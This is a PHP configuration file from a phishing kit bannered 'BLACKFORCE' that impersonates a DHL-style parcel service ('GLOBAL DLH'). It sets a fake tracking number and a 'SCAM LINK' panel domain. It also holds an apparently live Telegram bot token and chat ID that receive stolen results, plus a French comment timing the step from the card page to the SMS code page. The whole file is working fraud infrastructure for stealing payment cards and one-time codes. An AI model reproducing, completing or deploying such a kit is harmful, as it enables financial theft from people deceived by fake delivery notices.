<?php
/*
██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝   
Coded By Root_Dr
DM:@Root_Dr
*/
session_start();
error_reporting(0);

require "functions.php";

define("ANTIBOTPW_API", ''); // ANTIBOT.PW API

define("FLAG", '🌍');
define("SCAM_NAME", 'GLOBAL DLH');
define("WEBSITE", '');

define("TRACKN", '00340434311554980732');

// SCAM LINK
define("PANEL", 'https://kundenservice-support.com/');
// TELEGRAM BOT REZ CONFIG
define("TOKEN", '6611453715:AAGdZ-77M3HzHMHtHSv5_-Wgrt2tUUXhP44');
define("CHATID", '-1001945561814');
// MAIL REZ CONFIG
define("BULLET", '');
// le temps entre la page carte et sms et sms erreur met le toujour superieur que 15
define("TIMER", '20');

define("PIN", false);